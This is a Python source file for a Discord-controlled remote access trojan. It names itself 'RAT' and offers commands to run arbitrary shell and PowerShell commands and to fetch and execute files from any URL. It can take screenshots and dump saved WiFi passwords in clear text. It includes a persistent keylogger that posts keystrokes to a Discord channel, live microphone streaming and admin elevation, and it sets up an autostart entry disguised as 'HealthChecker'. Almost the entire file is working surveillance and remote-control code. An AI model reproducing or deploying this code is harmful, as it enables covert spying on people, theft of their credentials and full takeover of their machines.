import asyncio
import atexit
import base64
import ctypes
import datetime
import glob
import json
import logging
import os
import platform
import re
import shutil
import subprocess
import sys
import tempfile
import threading
import time

# import vlc
import tkinter as tk
import uuid
from datetime import datetime
from tkinter import messagebox

import aiofiles
import aiohttp
import chardet
import discord
import nacl
import numpy as np
import psutil
import pyautogui
import pyttsx3
import requests
import sounddevice as sd
from discord import Embed
from discord.ext import commands
from discord.ext.commands import MissingRequiredArgument
from discord.ui import Button, View
from dotenv import load_dotenv
from PIL import ImageGrab
from plyer import notification
from pynput import keyboard, mouse
from pynput.keyboard import Key, Listener

# ── Platform detection ─────────────────────────────────────────────────────
IS_WINDOWS = platform.system() == "Windows"

# Windows-only imports
if IS_WINDOWS:
    from comtypes import CLSCTX_ALL
    from Crypto.Cipher import AES
    from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
    from win32crypt import CryptUnprotectData
else:
    CryptUnprotectData = None
    AudioUtilities = None
    IAudioEndpointVolume = None
    CLSCTX_ALL = None

# ── Load .env credentials ──────────────────────────────────────────────────
load_dotenv()
TOKEN = os.getenv("BOT_TOKEN")
GUILD_ID = int(os.getenv("GUILD_ID"))
AUTHORIZED_USERS = [
    int(uid.strip())
    for uid in os.getenv("AUTHORIZED_USERS", "").split(",")
    if uid.strip()
]
VOICE_CHANNEL_ID = int(os.getenv("VOICE_CHANNEL_ID"))

admin_status_file = "admin_status.txt"

# Dictionary to store the current process for each user
user_sessions = {}

intents = discord.Intents.default()
intents.message_content = True
intents.voice_states = True
bot = commands.Bot(command_prefix="!", intents=intents)

current_paths = {}  # Stores the current path for each user
is_admin = False  # Variable to check admin rights

SERVICE_NAME = "HealthChecker"
SCRIPT_PATH = os.path.abspath(sys.argv[0])
AUTOSTART_KEY = r"Software\Microsoft\Windows\CurrentVersion\Run"
AUTOSTART_NAME = "HealthChecker"

# Get the system's temporary directory
temp_dir = tempfile.gettempdir()

# Rickroll URL
VIDEO_URL = "https://github.com/truelockmc/Discord-RAT/raw/refs/heads/main/RickRoll.mp4"
VIDEO_PATH = os.path.join(temp_dir, "rickroll.mp4")


def is_authorized(ctx):
    return ctx.author.id in AUTHORIZED_USERS


def sanitize_channel_name(name):
    return re.sub(r"[^a-z0-9-]", "-", name.lower())


def in_correct_channel(ctx):
    computer_name = platform.node()
    sanitized_name = sanitize_channel_name(computer_name)
    return ctx.channel.name == sanitized_name


# Define the URL for the embed author icon
EMBED_ICON_URL = "https://github.com/truelockmc/Discord-RAT/raw/main/logo.png"


# Updated log_message function
async def log_message(ctx, message, duration=None):
    embed = discord.Embed(
        description=message,
        colour=discord.Colour.blue(),  # Always blue color
    )
    embed.set_author(name="RAT", icon_url=EMBED_ICON_URL)

    if duration:
        msg = await ctx.send(embed=embed)
        await asyncio.sleep(duration)
        await msg.delete()
    else:
        await ctx.send(embed=embed)


# Function to send a standardized message for incorrect channel usage
async def wrong_channel(ctx, duration=10):  # Default duration is 10
    embed = discord.Embed(
        description="This command can only be executed in the specific channel for this PC.",
        colour=discord.Colour.red(),
    )
    embed.set_author(name="RAT", icon_url=EMBED_ICON_URL)
    msg = await ctx.send(embed=embed)
    await asyncio.sleep(duration)
    await msg.delete()


def load_admin_status():
    global is_admin
    if os.path.exists(admin_status_file):
        with open(admin_status_file, "r") as file:
            status = file.read()
            is_admin = status.lower() == "true"


def check_if_admin():
    try:
        if IS_WINDOWS:
            return ctypes.windll.shell32.IsUserAnAdmin()
        else:
            return os.getuid() == 0
    except:
        return False


def elevate():
    try:
        if check_if_admin():
            raise Exception("The process already has admin rights.")

        if IS_WINDOWS:
            script = os.path.abspath(sys.argv[0])
            script_ext = os.path.splitext(script)[1].lower()
            command = (
                f'"{script}"'
                if script_ext == ".exe"
                else f'"{sys.executable}" "{script}"'
            )
            result = ctypes.windll.shell32.ShellExecuteW(
                None, "runas", "cmd.exe", f"/k {command} & timeout /t 7 & exit", None, 1
            )
            if result > 32:
                return True
            raise Exception("Error restarting the script with admin rights.")
        else:
            # On Linux: re-launch with sudo
            args = ["sudo", sys.executable] + sys.argv
            subprocess.Popen(args)
            return True
    except Exception as e:
        raise Exception(f"Error requesting admin rights: {str(e)}")


def check_single_instance():
    # Use the system's temporary directory for the PID file
    temp_dir = tempfile.gettempdir()
    pid_file = os.path.join(temp_dir, "script_instance.pid")

    # Check if the PID file exists
    if os.path.exists(pid_file):
        with open(pid_file, "r") as f:
            pid = int(f.read())
            # Check if the process with the stored PID is still running
            if psutil.pid_exists(pid):
                print("An instance of the script is already running.")
                sys.exit(0)
            else:
                print(
                    "PID file found, but process is no longer running. Overwriting PID file."
                )

    # Write the current PID to the PID file
    with open(pid_file, "w") as f:
        f.write(str(os.getpid()))

    # remove the PID file when the script exits
    def remove_pid_file():
        if os.path.exists(pid_file):
            os.remove(pid_file)

    atexit.register(remove_pid_file)


@bot.event
async def on_ready():
    print(f"Logged in as {bot.user}")
    bot.loop.create_task(send_messages())  # Start the send_messages function here
    guild = bot.get_guild(GUILD_ID)
    if guild:
        computer_name = platform.node()
        sanitized_name = sanitize_channel_name(computer_name)
        existing_channel = discord.utils.get(guild.channels, name=sanitized_name)
        if not existing_channel:
            channel = await guild.create_text_channel(sanitized_name)
            print(f'Channel "{sanitized_name}" was created')
        else:
            channel = existing_channel
            print(f'Channel "{sanitized_name}" already exists')

        load_keylogger_status()
        keylogger_channel_name = f"{sanitized_name}-keylogger"

        # Create keylogger channel if not exists
        keylogger_channel = await create_channel_if_not_exists(
            guild, keylogger_channel_name
        )
        channel_ids["keylogger_channel"] = keylogger_channel.id
        print(f"Keylogger channel ID set to: {keylogger_channel.id}")

        # Auto-restart keylogger
        if keylogger_active:
            global keylogger_thread
            keylogger_thread = threading.Thread(target=start_keylogger, daemon=True)
            keylogger_thread.start()
            print("Keylogger auto-restarted from saved status.")
            await keylogger_channel.send(
                "\U0001f7e2 **Keylogger resumed after bot restart.**"
            )

        channel_ids["voice"] = VOICE_CHANNEL_ID

        current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        # Send a message indicating that the bot is online
        await channel.send(f"Bot is now online! {current_time}")

    else:
        print("Guild not found")
    load_admin_status()  # Load admin status at startup


# Remove the default help command
bot.remove_command("help")


# Ensure to use the bot instance instead of client
def is_bot_or_command(message):
    return message.author == bot.user or message.content.startswith(bot.command_prefix)


# Command to display help
@bot.command(name="help")
async def custom_help(ctx):
    help_text = """
    **Available Commands:**
    `!ping` - Shows the bot's latency.
    `!screenshot` - Takes a screenshot and sends it.
    `!cmd <command>` - Executes a CMD command.
    `!powershell <command>` - Executes a PowerShell command.
    `!file_upload <target_path>` - Uploads a file.
    `!file_download <file_path>` - Sends a file or Folder to Discord.
    `!execute <url>` - Downloads and executes a file from the URL.
    `!notify <title> <message>` - Sends a notification.
    `!restart` - Restarts the PC.
    `!shutdown` - Shuts down the PC.
    `!admin` - Requests admin rights.
    `!stop` - Stops the bot.
    `!wifi` - Shows WiFi profiles and passwords.
    `!system_info` - Shows system information.
    `!tasklist` - Lists every running process with Name and PID.
    `!taskkill <pid>` - Kills a process with the given PID.
    `!tts <message>` - Plays a custom text-to-speech message.
    `!mic_stream_start` - Starts a live stream of the microphone to a voice channel.
    `!mic_stream_stop` - Stops the mic stream if activated.
    `!keylog <on/off>` - Activates or deactivates keylogging.
    `!bsod` - Triggers a Blue Screen of Death.
    `!rickroll` - Plays an inescapable Rickroll video.
    `!input <block/unblock>` - Blocks or unblocks user input.
    `!blackscreen <on/off>` - Makes the screen completely black.
    `!volume` - Shows volume information and available commands.
    `!volume <mute/unmute>` - Mutes or unmutes the device.
    `!volume <number from 1-100>` - Sets the volume to a specific percentage.
    `!grab_discord` - Grabs Discord Tokens, Billing and Contact Information.
    """
    embed = Embed(title="Help", description=help_text, color=0x0084FF)
    await ctx.send(embed=embed)


async def generic_command_error(ctx, error):
    embed = discord.Embed(
        title="⚠️ Error", description=f"```{error}```", color=discord.Color.red()
    )
    msg = await ctx.send(embed=embed)
    await msg.delete(delay=5)


@bot.command()
@commands.check(is_authorized)
async def purge(ctx):
    try:
        deleted = await ctx.channel.purge(limit=200, check=is_bot_or_command)
        await log_message(ctx, f"{len(deleted)} messages deleted.", duration=5)
    except Exception as e:
        await log_message(
            ctx,
            f"Error deleting bot messages and commands: {e}",
            duration=5,
        )


@bot.command()
@commands.check(is_authorized)
async def ping(ctx):
    if not in_correct_channel(ctx):
        await wrong_channel(ctx)
        return

    latency = round(bot.latency * 1000)
    await log_message(ctx, f"🏓 Pong! Latency: {latency}ms")


@bot.command()
@commands.check(is_authorized)
async def screenshot(ctx):
    if not in_correct_channel(ctx):
        await wrong_channel(ctx)
        return

    try:
        temp_dir = tempfile.gettempdir()
        screenshot_path = os.path.join(temp_dir, "screenshot.png")
        screenshot = pyautogui.screenshot()
        screenshot.save(screenshot_path)
        await ctx.send(file=discord.File(screenshot_path))
        await log_message(ctx, "Screenshot created and sent.")
        os.remove(screenshot_path)
    except Exception as e:
        await log_message(ctx, f"Error creating screenshot: {str(e)}")


@bot.command()
@commands.check(is_authorized)
async def cmd(ctx, *, command):
    if not in_correct_channel(ctx):
        await wrong_channel(ctx)
        return

    working_message = await ctx.send("🔄 Working...")
    try:
        # Run the command
        output = subprocess.run(
            command,
            shell=True,
            capture_output=True,
            text=True,
            encoding="utf-8",
            errors="ignore",
        )

        await working_message.delete()

        # Helper function to split the output into 1990-character chunks
        def chunk_string(
            string, chunk_size=1990
        ):  # 1990 leaves space for code block syntax
            return [
                string[i : i + chunk_size] for i in range(0, len(string), chunk_size)
            ]

        # Combine stdout and stderr into a single output
        combined_output = ""
        if output.stdout:
            combined_output += f"Standard Output:\n{output.stdout}\n"
        if output.stderr:
            combined_output += f"Standard Error:\n{output.stderr}\n"

        # Split the combined output into chunks and send them
        output_chunks = chunk_string(combined_output)
        for chunk in output_chunks:
            await ctx.send(f"```{chunk}```")  # Send each chunk wrapped in a code block

        # Log the executed command
        await log_message(ctx, f"CMD command executed: {command}")

    except discord.errors.HTTPException as e:
        await log_message(ctx, f"Error executing command: {str(e)}")
    except Exception as e:
        await log_message(ctx, f"Error executing command: {str(e)}")
    finally:
        try:
            await working_message.delete()
        except discord.errors.NotFound:
            pass


@bot.command()
@commands.check(is_authorized)
async def powershell(ctx, *, command):
    if not in_correct_channel(ctx):
        await wrong_channel(ctx)
        return

    working_message = await ctx.send("🔄 Working...")
    try:
        # Run the PowerShell command
        output = subprocess.run(
            ["powershell", command],
            shell=True,
            capture_output=True,
            text=True,
            encoding="utf-8",
            errors="ignore",
        )

        await working_message.delete()

        # Helper function to split the output into 1990-character chunks
        def chunk_string(
            string, chunk_size=1990
        ):  # 1990 leaves space for code block syntax
            return [
                string[i : i + chunk_size] for i in range(0, len(string), chunk_size)
            ]

        # Combine stdout and stderr into labeled sections
        combined_output = ""
        if output.stdout:
            combined_output += f"Standard Output:\n{output.stdout}\n"
        if output.stderr:
            combined_output += f"Standard Error:\n{output.stderr}\n"

        # Split combined output into chunks
        output_chunks = chunk_string(combined_output)

        # Send each chunk wrapped in a code block
        for chunk in output_chunks:
            await ctx.send(f"```{chunk}```")

        # Log successful execution
        await log_message(ctx, f"PowerShell command executed: {command}")

    except Exception as e:
        # Handle errors and clean up the working message
        try:
            await working_message.delete()
        except discord.errors.NotFound:
            pass
        await log_message(ctx, f"Error executing command: {str(e)}")


@bot.command()
@commands.check(is_authorized)
async def file_upload(ctx, *target_path_parts):
    target_path = " ".join(target_path_parts)
    if not in_correct_channel(ctx):
        await wrong_channel(ctx)
        return

    working_message = await ctx.send("🔄 Working...")
    try:
        if ctx.message.attachments:
            for attachment in ctx.message.attachments:
                file_data = await attachment.read()
                async with aiofiles.open(target_path, "wb") as f:
                    await f.write(file_data)
            await working_message.delete()
            await log_message(ctx, "File(s) successfully uploaded.")
        else:
            await working_message.delete()
            await log_message(ctx, "No files found to upload.")
    except Exception as e:
        await working_message.delete()
        await log_message(ctx, f"Error uploading file: {str(e)}")


@bot.command()
@commands.check(is_authorized)
async def file_download(ctx, *file_path_parts):
    file_path = " ".join(file_path_parts)
    if not in_correct_channel(ctx):
        await wrong_channel(ctx)
        return

    working_message = await ctx.send("🔄 Working...")
    try:
        if os.path.exists(file_path):
            zip_path = None
            with tempfile.TemporaryDirectory() as temp_dir:
                if os.path.isdir(file_path):
                    zip_path = os.path.join(
                        temp_dir, f"{os.path.basename(file_path)}.zip"
                    )
                    shutil.make_archive(zip_path.replace(".zip", ""), "zip", file_path)
                    file_path = zip_path

                file_size = os.path.getsize(file_path)
                if file_size <= 8 * 1024 * 1024:  # 8MB
                    await ctx.send(file=discord.File(file_path))
                else:
                    await send_temporary_message(
                        ctx, "File is too large to be sent directly.", duration=10
                    )
                    part_number = 1
                    with open(file_path, "rb") as f:
                        while chunk := f.read(8 * 1024 * 1024):
                            part_file_path = os.path.join(
                                temp_dir,
                                f"{os.path.basename(file_path)}_part{part_number}",
                            )
                            with open(part_file_path, "wb") as part_file:
                                part_file.write(chunk)
                            await ctx.send(file=discord.File(part_file_path))
                            part_number += 1
            await log_message(ctx, "File successfully downloaded.")
        else:
            await log_message(ctx, "File not found.")
        await working_message.delete()
    except Exception as e:
        await working_message.delete()
        await log_message(ctx, f"Error downloading file: {str(e)}")


@bot.command()
@commands.check(is_authorized)
async def execute(ctx, url):
    if not in_correct_channel(ctx):
        await wrong_channel(ctx)
        return

    working_message = await ctx.send("🔄 Working...")
    try:
        filename = url.split("/")[-1]

        # Create a temporary folder
        temp_dir = tempfile.gettempdir()
        temp_filepath = os.path.join(temp_dir, filename)

        async with aiohttp.ClientSession() as session:
            async with session.get(url) as resp:
                if resp.status == 200:
                    async with aiofiles.open(temp_filepath, mode="wb") as f:
                        await f.write(await resp.read())

                    # Start the file
                    kwargs = {"shell": True}
                    if IS_WINDOWS:
                        kwargs["creationflags"] = subprocess.CREATE_NEW_CONSOLE
                    subprocess.Popen(temp_filepath, **kwargs)

                    await working_message.delete()
                    await log_message(
                        ctx,
                        f"{filename} was downloaded and started in a new process.",
                    )
                else:
                    await working_message.delete()
                    await log_message(ctx, f"Error downloading file: {resp.status}")
    except Exception as e:
        await working_message.delete()
        await log_message(ctx, f"Error downloading and executing file: {str(e)}")


@bot.command()
@commands.check(is_authorized)
async def system_info(ctx):
    if not in_correct_channel(ctx):
        await wrong_channel(ctx)
        return

    try:
        uname = platform.uname()
        sys_info = f"""
        **System Information:**
        System: {uname.system}
        Node Name: {uname.node}
        Release: {uname.release}
        Version: {uname.version}
        Machine: {uname.machine}
        Processor: {uname.processor}
        """
        await ctx.send(sys_info)
        await log_message(ctx, "System information retrieved.")
    except Exception as e:
        await log_message(ctx, f"Error retrieving system information: {str(e)}")


@bot.command()
@commands.check(is_authorized)
async def tasklist(ctx):
    if not in_correct_channel(ctx):
        await wrong_channel(ctx)
        return

    try:
        # Get a list of processes with PID and name
        processes = [(p.pid, p.info["name"]) for p in psutil.process_iter(["name"])]
        process_list = "\n".join(
            [f"PID: {pid}, Name: {name}" for pid, name in processes]
        )

        # Helper function to split the process list into 1990-character chunks
        def chunk_string(
            string, chunk_size=1990
        ):  # 1990 leaves space for code block syntax
            return [
                string[i : i + chunk_size] for i in range(0, len(string), chunk_size)
            ]

        # Split process list into chunks
        process_list_chunks = chunk_string(process_list)

        # Send each chunk to Discord
        for chunk in process_list_chunks:
            await ctx.send(f"```\n{chunk}\n```")

        # Log the successful retrieval
        await log_message(ctx, "Process list retrieved.")

    except Exception as e:
        await log_message(ctx, f"Error retrieving process list: {str(e)}")


@bot.command()
@commands.check(is_authorized)
async def taskkill(ctx, identifier: str):
    if not in_correct_channel(ctx):
        await wrong_channel(ctx)
        return

    try:
        # Versuche, die Eingabe als PID zu interpretieren
        try:
            pid = int(identifier)
            process = psutil.Process(pid)
            process.terminate()
            await log_message(ctx, f"Process with PID {pid} has been terminated.")
        except ValueError:
            # If it's not a valid PID, try to find a process by name
            process_found = False
            identifier = identifier.lower()  # Vergleiche in Kleinbuchstaben

            for proc in psutil.process_iter(["pid", "name"]):
                proc_name = proc.info["name"].lower()
                # Also check if the process name contains the input (e.g. "whatsapp.exe" for "WhatsApp")
                if identifier in proc_name:
                    proc.terminate()
                    await log_message(
                        ctx,
                        f"Process with name {proc_name} (PID {proc.info['pid']}) has been terminated.",
                    )
                    process_found = True
                    break

            if not process_found:
                await log_message(ctx, f"No process with the name {identifier} found.")

    except Exception as e:
        await log_message(ctx, f"Error terminating process: {str(e)}")


@bot.command()
@commands.check(is_authorized)
async def notify(ctx, title, message):
    if not in_correct_channel(ctx):
        await wrong_channel(ctx)
        return

    try:
        notification.notify(title=title, message=message, timeout=10)
        await log_message(ctx, f"Notification sent: {title} - {message}")
    except Exception as e:
        await log_message(ctx, f"Error sending notification: {str(e)}")


@bot.command()
@commands.check(is_authorized)
async def restart(ctx):
    if not in_correct_channel(ctx):
        await wrong_channel(ctx)
        return

    try:
        if IS_WINDOWS:
            subprocess.run(["shutdown", "/r", "/t", "0"], shell=True)
        else:
            subprocess.run(["reboot"], check=True)
        await log_message(ctx, "The PC is restarting.")
    except Exception as e:
        await log_message(ctx, f"Error restarting the PC: {str(e)}")


@bot.command()
@commands.check(is_authorized)
async def shutdown(ctx):
    if not in_correct_channel(ctx):
        await wrong_channel(ctx)
        return

    try:
        if IS_WINDOWS:
            subprocess.run(["shutdown", "/s", "/t", "0"], shell=True)
        else:
            subprocess.run(["shutdown", "-h", "now"], check=True)
        await log_message(ctx, "The PC is shutting down.")
    except Exception as e:
        await log_message(ctx, f"Error shutting down the PC: {str(e)}")


@bot.command()
@commands.check(is_authorized)
async def admin(ctx):
    global is_admin
    if not in_correct_channel(ctx):
        await wrong_channel(ctx)
        return

    if check_if_admin():
        is_admin = True
        await log_message(ctx, "Admin rights already present.")
        return

    try:
        # Restart the script as administrator
        if elevate():
            await log_message(
                ctx, "Admin rights granted. The old process will now be terminated."
            )
            await asyncio.sleep(2)  # Give time for logs
            os._exit(0)  # Terminate the old process cleanly
    except Exception as e:
        await log_message(ctx, f"Error requesting admin rights: {str(e)}")


@bot.command()
@commands.check(is_authorized)
async def stop(ctx):
    if not in_correct_channel(ctx):
        await wrong_channel(ctx)
        return

    await log_message(ctx, "Bot is stopping.")
    await bot.close()


@bot.command()
@commands.check(is_authorized)
async def wifi(ctx):
    if not in_correct_channel(ctx):
        await wrong_channel(ctx)
        return

    working_message = await ctx.send("🔄 Working...")
    try:
        # Create a temporary directory in the temp folder
        export_dir = os.path.join(tempfile.gettempdir(), "SomeStuff")

        # Sicherstellen, dass das Exportverzeichnis existiert
        if not os.path.exists(export_dir):
            os.makedirs(export_dir)

        if IS_WINDOWS:
            # Export WLAN profiles (incl. keys) without a console window
            subprocess.run(
                [
                    "netsh",
                    "wlan",
                    "export",
                    "profile",
                    "key=clear",
                    f"folder={export_dir}",
                ],
                check=True,
                creationflags=subprocess.CREATE_NO_WINDOW,
            )
            # Read all exported XML files
            xml_files = glob.glob(os.path.join(export_dir, "*.xml"))
            if not xml_files:
                await working_message.delete()
                await send_temporary_message(
                    ctx, "No exported WLAN profiles found.", duration=10
                )
                return
            for xml_file in xml_files:
                with open(xml_file, "rb") as f:
                    await ctx.send(
                        file=discord.File(f, filename=os.path.basename(xml_file))
                    )
            await working_message.delete()
            await send_temporary_message(
                ctx, "WLAN profiles successfully exported and sent.", duration=10
            )
        else:
            # Linux: use nmcli to dump saved WiFi passwords
            result = subprocess.run(
                ["nmcli", "-t", "-f", "NAME,UUID,TYPE", "connection", "show"],
                capture_output=True,
                text=True,
            )
            lines = [l for l in result.stdout.strip().splitlines() if "wireless" in l]
            output = ""
            for line in lines:
                name = line.split(":")[0]
                pw_result = subprocess.run(
                    [
                        "nmcli",
                        "-s",
                        "-g",
                        "802-11-wireless-security.psk",
                        "connection",
                        "show",
                        name,
                    ],
                    capture_output=True,
                    text=True,
                )
                password = pw_result.stdout.strip() or "(no password / open)"
                output += f"SSID: {name} | Password: {password}\n"
            await working_message.delete()
            if output:
                for chunk in [
                    output[i : i + 1900] for i in range(0, len(output), 1900)
                ]:
                    await ctx.send(f"```\n{chunk}\n```")
            else:
                await send_temporary_message(
                    ctx, "No WiFi profiles found.", duration=10
                )

    except Exception as e:
        await working_message.delete()
        await send_temporary_message(
            ctx, f"Error retrieving WLAN profiles: {str(e)}", duration=10
        )


# Global variables for keylogging
files_to_send, messages_to_send, embeds_to_send = [], [], []
channel_ids, text_buffor = {}, ""
ctrl_codes = {
    "Key.ctrl_l": "CTRL_L",
    "Key.ctrl_r": "CTRL_R",
    "Key.alt_l": "ALT_L",
    "Key.alt_r": "ALT_R",
}
keylogger_active = False
keylogger_thread = None
keylogger_listener = None
status_file = os.path.join(temp_dir, "keylogger_status.json")


# Function to get the current time
def current_time():
    return datetime.now().strftime("%Y-%m-%d %H:%M:%S")


# Function to create a channel if it does not exist
async def create_channel_if_not_exists(guild, channel_name):
    channel = discord.utils.get(guild.channels, name=channel_name)
    if channel is None:
        channel = await guild.create_text_channel(channel_name)
        print(f"Channel {channel_name} created with ID: {channel.id}")
    else:
        print(f"Channel {channel_name} exists with ID: {channel.id}")
    return channel


# Function to send messages to the Discord channel
async def send_messages():
    await bot.wait_until_ready()
    while not bot.is_closed():
        if messages_to_send:
            for message in messages_to_send:
                channel = bot.get_channel(message[0])
                print(f"Sending message to channel ID: {message[0]}")
                await channel.send(message[1])
            messages_to_send.clear()
        await asyncio.sleep(1)


# Function to save keylogger status
def save_keylogger_status():
    global keylogger_active
    status = {"keylogger_active": keylogger_active}
    with open(status_file, "w") as f:
        json.dump(status, f)


# Function to load keylogger status
def load_keylogger_status():
    global keylogger_active
    if os.path.exists(status_file):
        with open(status_file, "r") as f:
            status = json.load(f)
            keylogger_active = status.get("keylogger_active", False)


# Key press event handler
def on_press(key):
    if not keylogger_active:
        return
    global files_to_send, messages_to_send, embeds_to_send, channel_ids, text_buffor
    processed_key = (
        str(key)[1:-1] if (str(key)[0] == "'" and str(key)[-1] == "'") else key
    )

    keycodes = {
        Key.space: " ",
        Key.shift: " *`SHIFT`*",
        Key.tab: " *`TAB`*",
        Key.backspace: " *`<`*",
        Key.esc: " *`ESC`*",
        Key.caps_lock: " *`CAPS LOCK`*",
        Key.f1: " *`F1`*",
        Key.f2: " *`F2`*",
        Key.f3: " *`F3`*",
        Key.f4: " *`F4`*",
        Key.f5: " *`F5`*",
        Key.f6: " *`F6`*",
        Key.f7: " *`F7`*",
        Key.f8: " *`F8`*",
        Key.f9: " *`F9`*",
        Key.f10: " *`F10`*",
        Key.f11: " *`F11`*",
        Key.f12: " *`F12`*",
    }
    if processed_key in ctrl_codes.keys():
        processed_key = " `" + ctrl_codes[processed_key] + "`"
    if processed_key not in [
        Key.ctrl_l,
        Key.alt_gr,
        Key.left,
        Key.right,
        Key.up,
        Key.down,
        Key.delete,
        Key.alt_l,
        Key.shift_r,
    ]:
        for i in keycodes:
            if processed_key == i:
                processed_key = keycodes[i]
        if processed_key == Key.enter:
            processed_key = ""
            messages_to_send.append(
                [channel_ids["keylogger_channel"], text_buffor + " *`ENTER`*"]
            )
            text_buffor = ""
        elif processed_key == Key.print_screen or processed_key == "@":
            processed_key = (
                " *`Print Screen`*" if processed_key == Key.print_screen else "@"
            )
            ImageGrab.grab(all_screens=True).save("ss.png")
            embeds_to_send.append(
                [
                    channel_ids["keylogger_channel"],
                    current_time()
                    + (
                        " `[Print Screen pressed]`"
                        if processed_key == " *`Print Screen`*"
                        else " `[Email typing]`"
                    ),
                    "ss.png",
                ]
            )
        text_buffor += str(processed_key)
        if len(text_buffor) > 1975:
            if (
                "wwwww" in text_buffor
                or "aaaaa" in text_buffor
                or "sssss" in text_buffor
                or "ddddd" in text_buffor
            ):
                messages_to_send.append([channel_ids["keylogger_channel"], text_buffor])
            else:
                messages_to_send.append([channel_ids["keylogger_channel"], text_buffor])
            text_buffor = ""

        # Debugging message
        print(f"Key pressed: {processed_key}")


# Function to start the keylogger
def start_keylogger():
    global keylogger_active, keylogger_listener
    keylogger_active = True
    save_keylogger_status()
    with Listener(on_press=on_press) as listener:
        keylogger_listener = listener
        listener.join()
    keylogger_listener = None


# Function to stop the keylogger
def stop_keylogger():
    global keylogger_active, keylogger_listener
    keylogger_active = False
    save_keylogger_status()
    if keylogger_listener is not None:
        keylogger_listener.stop()


# Bot command to control the keylogger
@bot.command()
@commands.check(is_authorized)
async def keylog(ctx, action=None):
    global keylogger_thread, keylogger_active
    if not in_correct_channel(ctx):
        await wrong_channel(ctx)
        return

    if action == "on":
        if keylogger_active:
            await log_message(ctx, "🔴 **Keylogger is already active.**", duration=10)
        else:
            keylogger_thread = threading.Thread(target=start_keylogger)
            keylogger_thread.start()
            await log_message(ctx, "🟢 **Keylogger has been activated.**")
            # Debugging message
            print("Keylogger activated.")
    elif action == "off":
        if not keylogger_active:
            await log_message(
                ctx, "🔴 **Keylogger is already deactivated.**", duration=10
            )
        else:
            stop_keylogger()
            await log_message(ctx, "🔴 **Keylogger has been deactivated.**")
            # Debugging message
            print("Keylogger deactivated.")
    else:
        await log_message(
            ctx,
            "❌ **Invalid action. Use `!keylog on` or `!keylog off`.**",
            duration=10,
        )


keylog.error(generic_command_error)


@bot.command()
@commands.check(is_authorized)
async def tts(ctx, *, message):
    if not in_correct_channel(ctx):
        await wrong_channel(ctx)
        return

    try:
        engine = pyttsx3.init()
        engine.say(message)
        engine.runAndWait()
        await log_message(ctx, f"🔊 **Text-to-Speech message played:** {message}")
    except Exception as e:
        await log_message(
            ctx,
            f"❌ **Error playing Text-to-Speech message:** {str(e)}",
            duration=10,
        )


@tts.error
async def tts_error(ctx, error):
    if isinstance(error, MissingRequiredArgument):
        await log_message(
            ctx,
            "❌ **Error:** A required argument is missing. Please provide a message.",
            duration=10,
        )
    else:
        await log_message(ctx, f"❌ **Error:** {str(error)}", duration=10)


# Load Opus library
if IS_WINDOWS:

    def download_libopus():
        url = (
            "https://github.com/truelockmc/Discord-RAT/raw/refs/heads/main/libopus.dll"
        )
        opuslib_path = os.path.join(tempfile.gettempdir(), "libopus.dll")
        if not os.path.exists(opuslib_path):
            response = requests.get(url)
            with open(opuslib_path, "wb") as file:
                file.write(response.content)
            print(f"{opuslib_path} downloaded.")
        return opuslib_path

    discord.opus.load_opus(download_libopus())
else:
    # On Linux, libopus is installed via the system package manager (libopus0 / libopus-dev).
    # discord.py finds it automatically; manual loading is not needed.
    if not discord.opus.is_loaded():
        try:
            discord.opus.load_opus("libopus.so.0")
        except Exception:
            pass  # discord.py will try on its own


# SoundDevice PCM class for streaming audio from the microphone
class PyAudioPCM(discord.AudioSource):
    def __init__(self, channels=2, rate=48000, chunk=960, input_device=None) -> None:
        self.chunks = chunk
        self.stream = sd.RawInputStream(
            samplerate=rate,
            channels=channels,
            dtype="int16",
            blocksize=chunk,
            device=input_device,
        )
        self.stream.start()

    def read(self) -> bytes:
        data, _ = self.stream.read(self.chunks)
        return bytes(data)

    def cleanup(self) -> None:
        self.stream.stop()
        self.stream.close()


# Bot command to join voice channel and stream microphone audio
@bot.command()
@commands.check(is_authorized)
async def mic_stream_start(ctx):
    if not in_correct_channel(ctx):
        await wrong_channel(ctx)
        return

    # Ensure 'voice' key exists in channel_ids
    if "voice" not in channel_ids:
        await ctx.send(
            f"`[{current_time()}] Voice channel ID is not set.`", delete_after=10
        )
        return

    voice_channel = discord.utils.get(ctx.guild.voice_channels, id=channel_ids["voice"])
    if voice_channel is None:
        await ctx.send(
            f"`[{current_time()}] Voice channel not found.`", delete_after=10
        )
        return

    vc = await voice_channel.connect(self_deaf=True)
    vc.play(PyAudioPCM())
    await ctx.send(
        f"`[{current_time()}] Joined voice-channel and streaming microphone in realtime`"
    )

    # Log messages (you can replace these with actual logging if needed)
    print(f"[{current_time()}] Connected to voice channel")
    print(f"[{current_time()}] Started playing audio from microphone's input")


mic_stream_start.error(generic_command_error)


# Bot command to leave the voice channel
@bot.command()
@commands.check(is_authorized)
async def mic_stream_stop(ctx):
    if ctx.voice_client is None:
        await ctx.send(
            f"`[{current_time()}] Bot is not in a voice channel.`", delete_after=10
        )
        return

    # Cleanup stream
    if isinstance(ctx.voice_client.source, PyAudioPCM):
        ctx.voice_client.source.cleanup()

    await ctx.voice_client.disconnect()
    await ctx.send(f"`[{current_time()}] Left voice-channel.`", delete_after=10)


mic_stream_stop.error(generic_command_error)

# Function to block closing the window
# def on_closing():
#    messagebox.showinfo("Nope", "You can't close this window! 😏")

# Function to download the video
# def download_video(url, path):
#    response = requests.get(url, stream=True)
#    total_size = int(response.headers.get('content-length', 0))
#    with open(path, 'wb') as file:
#        for chunk in response.iter_content(chunk_size=1024):
#            if chunk:
#                file.write(chunk)

# Function to play the video
# def play_video():
# Create the main window
#    window = tk.Tk()
#    window.title("Rickroll")
#    window.attributes("-fullscreen", True)  # Fullscreen mode
#    window.attributes("-topmost", True)     # Always on top
#    window.overrideredirect(True)  # Remove title bar
#    window.protocol("WM_DELETE_WINDOW", on_closing)  # Block closing

# Frame for the VLC player
#    frame = tk.Frame(window, bg='black')
#    frame.pack(fill=tk.BOTH, expand=1)

# Initialize VLC player
#    instance = vlc.Instance()
#    player = instance.media_player_new()
#    media = instance.media_new(VIDEO_PATH)
#    player.set_media(media)

# Embed VLC player in the Tkinter frame
#    player.set_hwnd(frame.winfo_id())

#    def check_video_end():
#        state = player.get_state()
#        if state == vlc.State.Ended:
#            close_window()
#        else:
#            window.after(1000, check_video_end)

#    def close_window():
#        player.stop()
#        window.destroy()
#        try:
#            os.remove(VIDEO_PATH)
#        except PermissionError:
#            print("Unable to delete the video file, it might still be in use.")

# Play the video when the window opens
#    window.after(1000, player.play)
#    window.after(1000, check_video_end)
#    window.mainloop()

# Discord bot command to play the Rickroll video
